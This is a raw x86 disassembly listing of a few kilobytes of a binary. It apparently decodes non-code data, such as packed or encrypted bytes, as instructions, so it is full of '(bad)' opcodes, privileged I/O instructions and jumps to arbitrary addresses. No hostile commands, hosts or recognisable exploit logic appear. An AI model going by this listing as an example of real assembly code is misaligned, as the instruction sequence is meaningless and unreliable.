  421f4b:	jo     0x421fa2
  421f4d:	mov    eax,0x87df0d64
  421f52:	xchg   ebp,eax
  421f53:	pushf  
  421f54:	lahf   
  421f55:	push   ebp
  421f56:	fnstenv [edi]
  421f58:	retf   
  421f59:	cwde   
  421f5a:	mov    WORD PTR ds:0xcf32a4ac,gs
  421f60:	loope  0x421f96
  421f62:	pop    ds
  421f63:	imul   ebx,DWORD PTR [ebx],0x53
  421f66:	jbe    0x421f5b
  421f68:	mov    bh,0x13
  421f6a:	sbb    ch,BYTE PTR [edx+edx*8]
  421f6d:	int3   
  421f6e:	mov    dh,0x0
	...
  421f78:	add    BYTE PTR [eax],al
  421f7a:	out    dx,al
  421f7b:	ret    0x2d9d
  421f7e:	mov    ebp,0x33c3fe7f
  421f83:	ja     0x421f4e
  421f85:	or     BYTE PTR [ecx],ch
  421f87:	sbb    DWORD PTR ss:[esp+eiz*8-0x2fffe66],edx
  421f8f:	add    DWORD PTR [eax],eax
  421f91:	add    BYTE PTR [esi],bl
  421f93:	in     al,dx
  421f94:	bound  esp,QWORD PTR [esi+0x53]
  421f97:	dec    ebx
  421f98:	xchg   esp,eax
  421f99:	lahf   
  421f9a:	jno    0x421f71
  421f9c:	xor    DWORD PTR [ebx+ecx*8-0x34],ecx
  421fa0:	sub    dh,BYTE PTR [edx+0x1c]
  421fa3:	sub    al,BYTE PTR [eax]
  421fa5:	jecxz  0x421f84
  421fa7:	jmp    0x1d83:0x2ac9a012
  421fae:	fisubr DWORD PTR [edx+esi*8-0x1c4e3ef4]
  421fb5:	push   es
  421fb6:	popa   
  421fb7:	ret    0xa515
  421fba:	js     0x42202a
  421fbc:	and    BYTE PTR [ecx-0x56],al
  421fbf:	loope  0x42202d
  421fc1:	arpl   WORD PTR [edi+0xa],bx
  421fc4:	cmp    BYTE PTR [ebx-0x65],0xaf
  421fc8:	test   BYTE PTR [ebx-0x5f],0x3c
  421fcc:	mov    bh,0xc
  421fce:	push   eax
  421fcf:	or     DWORD PTR [edx+ebp*8-0x54],edi
  421fd3:	pop    es
  421fd4:	cmp    DWORD PTR [edi+0x42d38d47],esi
  421fda:	jb     0x422006
  421fdc:	add    ah,al
  421fde:	stos   DWORD PTR es:[edi],eax
  421fdf:	jle    0x422016
  421fe1:	or     DWORD PTR [eax],edx
  421fe3:	rcr    eax,0x70
  421fe6:	aad    0xd
  421fe8:	cs in  al,dx
  421fea:	out    0xca,al
  421fec:	mov    esi,0x6f29d299
  421ff1:	call   DWORD PTR [ecx]
  421ff3:	xlat   BYTE PTR ds:[ebx]
  421ff4:	sub    DWORD PTR [eax-0x4f68e39f],edx
  421ffa:	aas    
  421ffb:	xchg   esp,eax
  421ffc:	mov    ds:0xeddf1148,eax
  422001:	mov    bl,0xaa
  422003:	xor    ah,BYTE PTR [edi]
  422005:	and    edx,DWORD PTR [ebx-0xa9a097]
  42200b:	(bad)  
  42200c:	dec    ebx
  42200d:	jp     0x422072
  42200f:	inc    BYTE PTR [esi+0x742d380c]
  422015:	and    ch,BYTE PTR [esi+0x2d719346]
  42201b:	mov    ebp,esi
  42201d:	test   al,0xd2
  42201f:	mov    ds:0xddd8a4c6,al
  422024:	es cmp ebp,ebx
  422027:	popa   
  422028:	jne    0x42206c
  42202a:	jl     0x422047
  42202c:	push   edi
  42202d:	xor    dh,bh
  42202f:	or     al,0x4d
  422031:	outs   dx,DWORD PTR ds:[esi]
  422032:	mov    dl,0xcd
  422034:	lods   eax,DWORD PTR ds:[esi]
  422035:	cmp    eax,0x1c7612bd
  42203a:	push   ecx
  42203b:	inc    ebp
  42203c:	xchg   BYTE PTR [ebx+0x11962d11],dh
  422042:	cmp    al,0x5
  422044:	int3   
  422045:	aas    
  422046:	push   es
  422047:	mov    esi,0xc8ac7ad5
  42204c:	imul   esi,DWORD PTR [ebp-0x2984e2ff],0xffffff95
  422053:	pop    ecx
  422054:	lods   al,BYTE PTR ds:[esi]
  422055:	xor    al,0x90
  422057:	push   es
  422058:	jp     0x422066
  42205a:	stos   DWORD PTR es:[edi],eax
  42205b:	pop    ebp
  42205c:	sbb    al,BYTE PTR [eax+0x39]
  42205f:	fidivr WORD PTR [esi]
  422061:	jge    0x42209f
  422063:	dec    eax
  422064:	cmc    
  422065:	and    BYTE PTR [eax+eiz*1+0x2ee59b52],0x57
  42206d:	pop    edx
  42206e:	and    bl,al
  422070:	xor    eax,0x4dc938fc
  422075:	in     eax,0xe0
  422077:	xchg   ecx,eax
  422078:	je     0x42203c
  42207a:	rol    ebx,0xa9
  42207d:	lods   al,BYTE PTR ds:[esi]
  42207e:	lods   eax,DWORD PTR ds:[esi]
  42207f:	pop    edx
  422080:	inc    eax
  422081:	shl    dh,0x42
  422084:	loope  0x42207d
  422086:	rcr    al,1
  422088:	mov    ecx,0x3b561f00
  42208d:	add    ecx,DWORD PTR [esi+0x6b]
  422090:	jge    0x42206c
  422092:	pushf  
  422093:	imul   ebp,ebp,0xfffffff1
  422096:	push   eax
  422097:	lds    edx,FWORD PTR [ebx+esi*8+0x62]
  42209b:	pop    ss
  42209c:	das    
  42209d:	(bad)  
  42209e:	loopne 0x42208b
  4220a0:	fwait
  4220a1:	(bad)  
  4220a2:	clc    
  4220a3:	ret    0x7d6c
  4220a6:	dec    ebx
  4220a7:	pop    ds
  4220a8:	jb     0x42204b
  4220aa:	lahf   
  4220ab:	ret    0x53a7
  4220ae:	mov    ebp,0xbc244487
  4220b3:	enter  0xa9c2,0x12
  4220b7:	cld    
  4220b8:	dec    esp
  4220b9:	or     eax,0x6dc797fa
  4220be:	loop   0x4220d0
  4220c0:	js     0x42209e
  4220c2:	xor    esi,0x655371fe
  4220c8:	sub    dh,dh
  4220ca:	retf   
  4220cb:	xchg   ecx,eax
  4220cc:	cmc    
  4220cd:	push   esi
  4220ce:	inc    esi
  4220d0:	mov    al,bh
  4220d2:	cwde   
  4220d3:	add    al,0x30
  4220d5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4220d6:	sub    bl,BYTE PTR [edx]
  4220d8:	push   edi
  4220d9:	mov    dh,0xe6
  4220db:	int3   
  4220dc:	or     esp,DWORD PTR ds:0xc90de98f
  4220e2:	add    DWORD PTR [esi],edi
  4220e4:	or     BYTE PTR [ecx+0x6b],0x75
  4220e8:	ds xchg esp,eax
  4220ea:	fld    TBYTE PTR [edx-0x7724d1df]
  4220f0:	mov    ebx,gs
  4220f2:	(bad)  
  4220f3:	mov    al,ds:0xd46ea917
  4220f8:	push   cs
  4220f9:	pop    ds
  4220fa:	repz and BYTE PTR [edi-0x4b],0xb8
  4220ff:	jge    0x422100
  422101:	add    edx,ecx
  422103:	adc    DWORD PTR [edi+0x52],eax
  422106:	(bad)  
  422107:	gs dec ecx
  422109:	stos   DWORD PTR es:[edi],eax
  42210a:	dec    cl
  42210c:	test   eax,0x8ee65e28
  422111:	adc    dl,BYTE PTR [edx+0x25a26ea4]
  422117:	outs   dx,DWORD PTR ds:[esi]
  422118:	clc    
  422119:	push   es
  42211a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42211b:	mov    ebx,0xb4fd63fa
  422120:	cmc    
  422121:	cld    
  422122:	call   0x25571ccd
  422127:	in     al,dx
  422128:	jns    0x422149
  42212a:	mov    al,ds:0x88482ac4
  42212f:	ds out 0x67,al
  422132:	out    dx,eax
  422133:	popa   
  422134:	jb     0x4220ed
  422136:	pop    ecx
  422137:	adc    eax,DWORD PTR [edi+0x7c]
  42213a:	stc    
  42213b:	int    0x2e
  42213d:	test   eax,0x3fcd0f7a
  422142:	enter  0x8f09,0x20
  422146:	inc    edx
  422147:	loopne 0x422147
  422149:	shl    BYTE PTR ds:0x36928bd3,cl
  42214f:	adc    al,0x16
  422151:	mov    cl,0xc6
  422153:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422154:	std    
  422155:	outs   dx,BYTE PTR ds:[esi]
  422156:	ss test eax,0x6716d5ff
  42215c:	add    al,0xab
  42215e:	ret    0xc68f
  422161:	scas   eax,DWORD PTR es:[edi]
  422162:	pop    eax
  422163:	xchg   DWORD PTR [ecx-0x25],esi
  422166:	daa    
  422167:	(bad)  
  422168:	ss or  eax,0xb14e9d65
  42216e:	dec    ecx
  42216f:	add    BYTE PTR [esi+0x33a28d7d],bl
  422175:	sbb    al,0xb0
  422177:	lahf   
  422178:	jl     0x422129
  42217a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42217b:	pop    ss
  42217c:	cmp    al,0x8
  42217e:	xlat   BYTE PTR ds:[ebx]
  42217f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422180:	dec    edi
  422181:	add    BYTE PTR [edx+0x7d],bh
  422184:	ficom  WORD PTR [edx+0x1f0b26c3]
  42218a:	rol    DWORD PTR [eax+0x32],0xc0
  42218e:	sub    DWORD PTR [eax],eax
	...
  422198:	add    BYTE PTR [eax],al
  42219a:	push   ebx
  42219b:	(bad)  
  42219c:	(bad)  
  42219d:	push   esi
  42219e:	(bad)  
  42219f:	jle    0x42219c
  4221a1:	xlat   BYTE PTR ds:[ebx]
  4221a2:	retf   
  4221a3:	push   ds
  4221a4:	test   DWORD PTR [ebp-0x6d],0xe1f048f5
  4221ab:	pushf  
  4221ac:	add    DWORD PTR [eax],eax
  4221ae:	std    
  4221af:	add    DWORD PTR [eax],eax
  4221b1:	add    BYTE PTR [esi+0x56460768],ch
  4221b7:	stos   DWORD PTR es:[edi],eax
  4221b8:	fisub  WORD PTR [ebx-0x47c227f5]
  4221be:	fdivrp st(5),st
  4221c0:	stc    
  4221c1:	mov    al,0x7d
  4221c3:	push   ebx
  4221c4:	sbb    al,0xc
  4221c6:	mov    ch,BYTE PTR [edi]
  4221c8:	lock test eax,0x217f72ac
  4221ce:	dec    esp
  4221cf:	sub    edx,DWORD PTR [ecx+0x6f]
  4221d2:	(bad)  
  4221d3:	fistp  WORD PTR [eax+0x55]
  4221d6:	jge    0x4221e9
  4221d8:	jbe    0x42224f
  4221da:	and    eax,0x77828002
  4221df:	daa    
  4221e0:	mov    edx,0x90fa1307
  4221e5:	shr    DWORD PTR [ecx-0x20],cl
  4221e8:	daa    
  4221e9:	iret   
  4221ea:	shl    ebx,1
  4221ec:	add    edx,DWORD PTR [ecx-0x1886edf2]
  4221f2:	and    BYTE PTR [ebp-0x34],bl
  4221f5:	imul   BYTE PTR [esi]
  4221f7:	ss popw ss
  4221fa:	mov    al,ds:0x5d466ff2
  4221ff:	xor    eax,0xa6bdea0c
  422204:	jg     0x4221fa
  422206:	test   DWORD PTR [edx],edi
  422208:	icebp  
  422209:	sub    DWORD PTR [edx],0x7d
  42220c:	cmp    BYTE PTR [esi+0x4bf16f1],al
  422212:	mov    edi,ebp
  422214:	call   0x6fef:0xcc53daa1
  42221b:	and    BYTE PTR [edx+esi*2-0x67],cl
  42221f:	sti    
  422220:	cmp    al,0xfd
  422222:	mov    esp,DWORD PTR [esi+0x62]
  422225:	call   0x7d55:0x89a35728
  42222c:	js     0x4221d2
  42222e:	pop    edi
  42222f:	idiv   bh
  422231:	iret   
  422232:	ret    0x93c7
  422235:	pop    ss
  422236:	sar    al,0x4b
  422239:	(bad)  
  42223a:	mov    ds:0x434f9edf,al
  42223f:	push   esi
  422240:	ds stos BYTE PTR es:[edi],al
  422242:	aam    0x4f
  422244:	inc    ebp
  422245:	xchg   ecx,eax
  422246:	and    eax,0xd6f584ee
  42224b:	jle    0x4222b2
  42224d:	adc    BYTE PTR [esi-0x713d8981],0x36
  422254:	std    
  422255:	std    
  422256:	mov    esi,0xd0580409
  42225b:	cs test al,0x20
  42225e:	inc    esp
  42225f:	ds scas eax,DWORD PTR es:[edi]
  422261:	retf   
  422262:	add    bh,BYTE PTR [ecx]
  422264:	jle    0x422287
  422266:	push   0x7198f36f
  42226b:	push   edx
  42226c:	push   ds
  42226d:	loopne 0x422262
  42226f:	fist   DWORD PTR [esi+0x2c5fe65f]
  422275:	pop    ebx
  422276:	or     al,0x40
  422278:	push   esi
  422279:	or     DWORD PTR [esi],eax
  42227b:	cmp    eax,0x7bbe91b3
  422280:	adc    al,0x71
  422282:	jnp    0x422227
  422284:	or     al,0xf8
  422286:	daa    
  422287:	xchg   ebx,eax
  422288:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422289:	cmp    eax,0xd9f0f3b6
  42228e:	push   ebx
  42228f:	int    0x29
  422291:	push   edx
  422292:	in     eax,dx
  422293:	fwait
  422294:	add    edx,DWORD PTR [ebx+ecx*8]
  422297:	sbb    al,BYTE PTR [edi+0x2ab86ed9]
  42229d:	push   eax
  42229e:	int    0x17
  4222a0:	and    eax,0x4b2cb55
  4222a5:	daa    
  4222a6:	lods   al,BYTE PTR ds:[esi]
  4222a7:	les    esi,FWORD PTR [ecx+0x54]
  4222aa:	lods   al,BYTE PTR ds:[esi]
  4222ab:	out    dx,al
  4222ac:	push   0x4b5875e0
  4222b1:	add    edx,0x26e6ee1a
  4222b7:	pop    es
  4222b8:	ins    BYTE PTR es:[edi],dx
  4222b9:	repz jb 0x422241
  4222bc:	pop    edx
  4222bd:	in     eax,dx
  4222be:	retf   
  4222bf:	pop    ebx
  4222c0:	mov    ecx,0x718135ce
  4222c5:	and    eax,0x84f3b8a1
  4222ca:	sbb    DWORD PTR [edi-0x233c5852],eax
  4222d0:	(bad)  
  4222d1:	in     al,dx
  4222d2:	fs cli 
  4222d4:	shl    BYTE PTR [eax+0x4a124d52],1
  4222da:	call   0x3c9a:0x2d01370b
  4222e1:	add    DWORD PTR ds:0x67743144,esi
  4222e7:	push   ss
  4222e8:	out    0xf9,eax
  4222ea:	out    0xff,eax
  4222ec:	sbb    eax,DWORD PTR [edi-0x6c]
  4222ef:	cmp    al,0x32
  4222f1:	or     eax,0x2decc2e6
  4222f6:	dec    edi
  4222f7:	ins    BYTE PTR es:[edi],dx
  4222f8:	in     eax,0xfe
  4222fa:	(bad)  
  4222fb:	jo     0x422372
  4222fd:	retf   
  4222fe:	shl    DWORD PTR [ecx],0xb0
  422301:	dec    ecx
  422302:	clc    
  422303:	xor    DWORD PTR [ebx],0x2ddbe2ad
  422309:	push   0x76
  42230b:	push   esp
  42230c:	add    ah,BYTE PTR [edi-0x1dfee765]
  422312:	loopne 0x42229b
  422314:	aam    0xd8
  422316:	sbb    ch,BYTE PTR [esi+0xd84db85]
  42231c:	fcomp  QWORD PTR [ecx+eiz*4-0x4e51d1df]
  422323:	add    ebp,edx
  422325:	push   esi
  422326:	add    cl,dl
  422328:	nop
  422329:	fbstp  TBYTE PTR [ecx+eax*8-0x56]
  42232d:	pop    esp
  42232e:	fidivr WORD PTR [ecx]
  422330:	push   0xffffffdb
  422332:	cwde   
  422333:	adc    ebp,DWORD PTR [ecx]
  422335:	xchg   edi,eax
  422336:	outs   dx,BYTE PTR ds:[esi]
  422337:	xchg   edi,eax
  422338:	jl     0x4223b4
  42233a:	stos   DWORD PTR es:[edi],eax
  42233b:	in     eax,dx
  42233c:	mov    ebx,0x44c9e649
  422341:	test   DWORD PTR [esi],edx
  422343:	inc    eax
  422344:	push   eax
  422345:	imul   ah
  422347:	cld    
  422348:	cld    
  422349:	js     0x422310
  42234b:	push   0xa5c136e0
  422350:	call   0x76c2:0xcb175ff
  422357:	jae    0x42231d
  422359:	mov    WORD PTR [eax],ss
  42235b:	pop    esi
  42235c:	icebp  
  42235d:	shl    DWORD PTR [esi],1
  42235f:	dec    esp
  422360:	iret   
  422361:	cmp    edi,eax
  422363:	mov    ch,0x2b
  422365:	loopne 0x422367
  422367:	mov    cl,0x52
  422369:	jo     0x422357
  42236b:	sub    eax,0x38083605
  422370:	jae    0x4223b5
  422372:	cmp    al,BYTE PTR [edx-0x1d85246b]
  422378:	into   
  422379:	js     0x4223a3
  42237b:	jge    0x422319
  42237d:	ins    BYTE PTR es:[edi],dx
  42237e:	std    
  42237f:	pop    ss
  422380:	lds    edx,FWORD PTR [ecx+0x6d559cd6]
  422386:	leave  
  422387:	cwde   
  422388:	mov    ch,0x1
  42238a:	push   0xe5ae269f
  42238f:	dec    edx
  422390:	and    DWORD PTR [ebx],eax
  422392:	add    bl,BYTE PTR [edx]
  422394:	push   es
  422395:	in     al,0x94
  422397:	jbe    0x42235e
  422399:	add    BYTE PTR [edi+edi*1],dh
  42239c:	adc    BYTE PTR [ecx+0x100c0b39],cl
  4223a2:	push   esi
  4223a3:	xchg   esp,eax
  4223a4:	fwait
  4223a5:	out    0x40,al
  4223a7:	mov    bh,0xb2
  4223a9:	loop   0x422382
  4223ab:	std    
  4223ac:	scas   al,BYTE PTR es:[edi]
  4223ad:	sahf   
  4223ae:	xchg   BYTE PTR [eax],al
	...
  4223b8:	add    BYTE PTR [eax],al
  4223ba:	adc    DWORD PTR [esi],ecx
  4223bc:	or     dl,ch
  4223be:	pop    ds
  4223bf:	out    dx,al
  4223c0:	repz jmp FWORD PTR [ecx-0x6c]
  4223c4:	fucomp st(0)
  4223c6:	(bad)  
  4223c8:	iret   
  4223c9:	add    bl,dh
  4223cb:	sahf   
  4223cc:	add    DWORD PTR [eax],eax
  4223ce:	std    
  4223cf:	add    DWORD PTR [eax],eax
  4223d1:	add    al,al
  4223d3:	mov    al,0x41
  4223d5:	stc    
  4223d6:	or     DWORD PTR [edx-0x2f71fa86],ebx
  4223dc:	mov    ebx,0x8088154f
  4223e1:	dec    esi
  4223e2:	mov    cl,0x7
  4223e4:	aam    0x46
  4223e6:	mov    ebp,0xd5b4a17d
  4223eb:	push   0xffffff97
  4223ed:	sub    eax,0x8891584c
  4223f2:	adc    DWORD PTR [ecx+ebx*4-0x14f73a57],ebx
  4223f9:	cdq    
  4223fa:	or     dl,dh
  4223fc:	pop    ecx
  4223fd:	push   esi
  4223fe:	fs push es
  422400:	jge    0x4223c5
  422402:	add    ah,bh
  422404:	pop    ebx
  422405:	mov    ds,WORD PTR [ecx+ecx*8-0x5c136ba5]
  42240c:	mov    ds:0x60c6eff5,eax
  422411:	leave  
  422412:	out    dx,eax
  422413:	add    ah,BYTE PTR [ebp-0x36]
  422416:	cmp    BYTE PTR [ebx],ch
  422418:	cwde   
  422419:	cmp    al,0x55
  42241b:	outs   dx,DWORD PTR ds:[esi]
  42241c:	leave  
  42241d:	enter  0xbe57,0xf4
  422421:	xlat   BYTE PTR ds:[ebx]
  422422:	sbb    bl,dl
  422424:	add    BYTE PTR [edx-0xc754075],dl
  42242a:	sbb    BYTE PTR [ecx-0x7315c3bf],0xaf
  422431:	arpl   WORD PTR [edi+0x31],si
  422434:	xlat   BYTE PTR ds:[ebx]
  422435:	push   ax
  422437:	jbe    0x4223e6
  422439:	adc    BYTE PTR [ebx-0x4],al
  42243c:	pusha  
  42243d:	mov    eax,0x5d35916a
  422442:	adc    bl,dl
  422444:	push   0x5c
  422446:	mov    edi,0x36a469ee
  42244b:	and    edx,ebx
  42244d:	retf   0x52a6
  422450:	adc    ebx,edx
  422452:	outs   dx,BYTE PTR ds:[esi]
  422453:	mov    eax,ds:0x5e7938c8
  422458:	ins    BYTE PTR es:[edi],dx
  422459:	idiv   DWORD PTR [esi+0x24]
  42245c:	adc    ebx,esp
  42245e:	add    al,BYTE PTR [esi-0x28]
  422461:	push   ebp
  422462:	xlat   BYTE PTR ds:[ebx]
  422463:	pusha  
  422464:	imul   ebx,ebx,0xffffffbc
  422467:	aaa    
  422468:	jge    0x422435
  42246a:	mov    BYTE PTR [edx+edx*8-0xb1953b0],ah
  422471:	dec    edi
  422472:	adc    esp,esp
  422474:	ret    
  422475:	mov    cl,0x49
  422477:	dec    ebx
  422478:	mov    dl,ch
  42247a:	cld    
  42247b:	sahf   
  42247c:	sbb    esp,DWORD PTR [edx-0x33ef870f]
  422482:	mov    ds:0xd9731655,eax
  422487:	(bad)  
  422488:	out    dx,al
  422489:	dec    ebp
  42248a:	ins    BYTE PTR es:[edi],dx
  42248b:	outs   dx,BYTE PTR ds:[esi]
  42248c:	xchg   edi,eax
  42248d:	jbe    0x422468
  42248f:	adc    al,BYTE PTR [ebx-0x3696fc52]
  422495:	in     eax,dx
  422496:	inc    ebx
  422497:	int3   
  422498:	push   esp
  422499:	ins    DWORD PTR es:[edi],dx
  42249a:	cmp    DWORD PTR ds:0xf8c68bac,ebp
  4224a0:	(bad)  
  4224a1:	bound  esi,QWORD PTR [ebx-0x3]
  4224a4:	pop    ds
  4224a5:	in     eax,0xdf
  4224a7:	xchg   ebp,esi
  4224a9:	xchg   edi,eax
  4224aa:	xor    eax,0x5189e54a
  4224af:	push   cs
  4224b0:	or     ah,ah
  4224b2:	fist   WORD PTR [edi+edx*8-0x72]
  4224b6:	add    DWORD PTR [ecx+0x2a],ecx
  4224b9:	(bad)  
  4224ba:	adc    al,0x6c
  4224bc:	rcr    DWORD PTR [ecx+0x58bc1acf],1
  4224c2:	fimul  DWORD PTR [ecx]
  4224c4:	out    dx,eax
  4224c5:	sbb    dh,BYTE PTR [edx+0x28]
  4224c8:	fld    DWORD PTR [edx]
  4224ca:	(bad)  
  4224cb:	mov    eax,ds:0xb6b47539
  4224d0:	cmp    dl,cl
  4224d2:	leave  
  4224d3:	popf   
  4224d4:	in     eax,dx
  4224d5:	fld    DWORD PTR [eax+0x71c351a1]
  4224db:	popa   
  4224dc:	sub    al,0x54
  4224de:	ja     0x422465
  4224e0:	cmp    esp,esi
  4224e2:	jae    0x422501
  4224e4:	mov    bh,0xb4
  4224e6:	xchg   edi,eax
  4224e7:	ror    eax,0xe0
  4224ea:	push   ds
  4224eb:	loop   0x4224ff
  4224ed:	hlt    
  4224ee:	ss push ss
  4224f0:	or     eax,0xef44f094
  4224f5:	add    al,0x6
  4224f7:	pusha  
  4224f8:	data16 sbb dl,ch
  4224fb:	mov    ebx,0x40b0e4a0
  422500:	cld    
  422501:	stos   DWORD PTR es:[edi],eax
  422502:	hlt    
  422503:	fadd   QWORD PTR [ebx]
  422505:	es popa 
  422507:	ins    BYTE PTR es:[edi],dx
  422508:	adc    edx,DWORD PTR [ebx]
  42250a:	clts   
  42250c:	shl    BYTE PTR [ebp-0x2a18990b],0x4d
  422513:	adc    eax,0xb326024f
  422518:	sub    bh,BYTE PTR [edi-0x5a]
  42251b:	cmp    DWORD PTR [edx+ecx*2],esi
  42251e:	mov    esi,0xbbc2efb
  422523:	test   eax,ecx
  422525:	sbb    DWORD PTR [ebx+0x7d],ecx
  422528:	xchg   ebx,eax
  422529:	sub    ebp,DWORD PTR [edx]
  42252b:	popa   
  42252c:	add    dh,0x92
  42252f:	push   ecx
  422530:	push   ebp
  422531:	adc    al,0x85
  422533:	xor    al,0xa4
  422535:	dec    edi
  422536:	sub    bl,dh
  422538:	in     al,dx
  422539:	iret   
  42253a:	add    bl,bh
  42253c:	xchg   ecx,eax
  42253d:	pop    ds
  42253e:	scas   al,BYTE PTR es:[edi]
  42253f:	lock cmp DWORD PTR [esi+0x6d5a9fed],ecx
  422546:	xor    eax,0x726d7c48
  42254b:	fidivr DWORD PTR [esi+0x4]
  42254e:	repnz bound ebx,QWORD PTR ds:0xd370
  422554:	pop    edi
  422555:	retf   
  422556:	adc    eax,0xac1c04f2
  42255b:	int    0x7
  42255d:	daa    
  42255e:	mov    ecx,0xae41cf57
  422563:	fidivr DWORD PTR [edi]
  422565:	iret   
  422566:	lods   eax,DWORD PTR ds:[esi]
  422567:	fsubr  st,st(6)
  422569:	arpl   sp,cx
  42256b:	and    eax,0x54e97304
  422570:	fidiv  DWORD PTR [edx+0x77]
  422573:	sti    
  422574:	in     al,dx
  422575:	dec    esi
  422576:	clc    
  422577:	cmp    ebx,DWORD PTR [edi-0x7d61fa7]
  42257d:	(bad)  
  42257e:	jp     0x422577
  422580:	xchg   DWORD PTR [ecx-0x1514a3c8],edi
  422586:	mov    edx,0x499eae00
  42258b:	cmp    al,0xd3
  42258d:	dec    esp
  42258e:	sub    cl,BYTE PTR [ebp-0x3]
  422591:	test   ah,bh
  422593:	mov    DWORD PTR [ecx-0x44],eax
  422596:	lea    ebp,[ecx-0x3c]
  422599:	or     dl,BYTE PTR [edi+0x11]
  42259c:	ja     0x4225f9
  42259e:	dec    edi
  42259f:	inc    eax
  4225a0:	bnd jae 0x4225b4
  4225a3:	fldcw  WORD PTR [ecx]
  4225a5:	call   0x814616d8
  4225aa:	xchg   ecx,eax
  4225ab:	xor    BYTE PTR [edx-0x62],cl
  4225ae:	mov    ah,0xd0
  4225b0:	or     eax,0xbbcaabe
  4225b5:	lds    ebp,FWORD PTR [ebp+edi*1-0x34]
  4225b9:	add    BYTE PTR [ecx+0x1b],dl
  4225bc:	fs jmp 0x1f396f70
  4225c2:	dec    edi
  4225c3:	sar    BYTE PTR [edx+0x2b],1
  4225c6:	mov    bh,BYTE PTR [edi]
  4225c8:	or     BYTE PTR [esi+ecx*8-0x58],bh
  4225cc:	int    0x11
  4225ce:	mov    ebp,0x0
  4225d3:	add    BYTE PTR [eax],al
  4225d5:	add    BYTE PTR [eax],al
  4225d7:	add    BYTE PTR [eax],al
  4225d9:	add    cl,cl
  4225db:	xchg   esi,eax
  4225dc:	ins    DWORD PTR es:[edi],dx
  4225dd:	mov    dh,0x7f
  4225df:	(bad)  
  4225e0:	(bad)  
  4225e2:	out    0x3f,al
  4225e4:	nop
  4225e5:	sbb    edi,DWORD PTR [ecx-0x243d1d58]
  4225eb:	mov    al,ds:0x1fd0001
  4225f0:	add    BYTE PTR [eax],al
  4225f2:	test   DWORD PTR [edi+0x7912729b],0x1008e2ec
  4225fc:	fisub  DWORD PTR [edx]
  4225fe:	dec    esi
  4225ff:	and    edx,edi
  422601:	mov    dl,BYTE PTR [esi-0x2e]
  422604:	mov    edx,0xda7d5527
  422609:	inc    eax
  42260a:	mov    al,ds:0x565cebb5
  42260f:	leave  
  422610:	jae    0x42265e
  422612:	mov    ebp,0x67a9211a
  422617:	loopne 0x4225d4
  422619:	jns    0x42263a
  42261b:	fnstsw WORD PTR [edi-0xaca60b1]
  422621:	cmp    DWORD PTR [edi],0x68a8d77b
  422627:	and    al,0x2e
  422629:	stos   BYTE PTR es:[edi],al
  42262a:	or     bh,BYTE PTR [ebx+0x30]
  42262d:	push   ebp
  42262e:	enter  0x67da,0x56
  422632:	je     0x42266b
  422634:	out    0x4,eax
  422636:	in     al,0xbb
  422638:	not    ah
  42263a:	cs std 
  42263c:	add    BYTE PTR ds:0xd7536b0a,cl
  422642:	dec    ebx
  422643:	or     bh,BYTE PTR [eax]
  422645:	(bad)  
  422646:	(bad)  
  422647:	pop    ds
  422648:	test   al,0xb
  42264a:	rol    BYTE PTR [eax+0x53],cl
  42264d:	pusha  
  42264e:	sbb    dh,bh
  422650:	sub    eax,0x9a770c9
  422655:	cld    
  422656:	jno    0x4226ae
  422658:	js     0x422658
  42265a:	retf   
  42265b:	ins    BYTE PTR es:[edi],dx
  42265c:	or     eax,0x524a1e66
  422661:	idiv   dl
  422663:	cwde   
  422664:	fcomp  DWORD PTR [eax+eiz*2]
  422667:	cmp    ecx,ebx
  422669:	mov    ebp,ebx
  42266b:	in     al,0xd3
  42266d:	sbb    BYTE PTR ds:0x4f22daed,cl
  422673:	out    dx,eax
  422674:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422675:	stc    
  422676:	sub    eax,0xa5d9cc4b
  42267b:	jmp    0x9c90:0x2df79453
  422682:	push   0xaccbf678
  422687:	sub    eax,DWORD PTR [edx-0x62d3c76d]
  42268d:	popf   
  42268e:	mov    ebx,0xd1f8f0ea
  422693:	ins    DWORD PTR es:[edi],dx
  422694:	mov    esp,0x8478cd7b
  422699:	mov    ebp,0x2a2c5e28
  42269e:	mov    ch,0xc1
  4226a0:	dec    ebp
  4226a1:	xchg   sp,ax
  4226a3:	fldcw  WORD PTR [esi-0x20]
  4226a6:	js     0x422638
  4226a8:	lods   eax,DWORD PTR ds:[esi]
  4226a9:	jae    0x4226d5
  4226ab:	jns    0x42271d
  4226ad:	mov    edi,0x4ef6af2e
  4226b2:	ins    BYTE PTR es:[edi],dx
  4226b3:	fadd   QWORD PTR gs:[ebx+ebx*8+0x53]
  4226b8:	fisttp QWORD PTR fs:[ecx]
  4226bb:	mov    ds:0x6d19aba3,al
  4226c0:	push   es
  4226c1:	repz inc ebx
  4226c3:	out    dx,eax
  4226c4:	sbb    eax,0x53c810e4
  4226c9:	arpl   WORD PTR [bx+si-0xd59],bx
  4226ce:	inc    ebp
  4226cf:	add    DWORD PTR [ecx],esp
  4226d1:	pusha  
  4226d2:	es daa 
  4226d4:	jbe    0x42272e
  4226d6:	mov    cl,0x2e
  4226d8:	dec    ebp
  4226d9:	mov    BYTE PTR [edx+0x2d5aad33],ah
  4226df:	add    BYTE PTR [esi+eiz*1-0x16],ah
  4226e3:	mul    DWORD PTR [eax-0x13]
  4226e6:	ja     0x42266a
  4226e8:	jo     0xec902711
  4226ee:	jns    0x422762
  4226f0:	xchg   edi,eax
  4226f1:	mov    bl,BYTE PTR [ecx-0x53]
  4226f4:	les    ebx,FWORD PTR [edi+0x56143aa2]
  4226fa:	inc    ecx
  4226fb:	std    
  4226fc:	pop    ds
  4226fd:	ss daa 
  4226ff:	(bad)  
  422700:	pop    ebx
  422701:	pop    ebx
  422702:	or     al,0x5d
  422704:	cld    
  422705:	aam    0xd2
  422707:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422708:	jbe    0x4226b1
  42270a:	mov    ecx,0x18429266
  42270f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422710:	xchg   esi,eax
  422711:	jmp    0x926f50be
  422716:	xor    eax,0x9517d3c0
  42271b:	es cdq 
  42271d:	pop    esi
  42271e:	pop    edx
  42271f:	es out 0x79,eax
  422722:	mov    edi,0xc4092a02
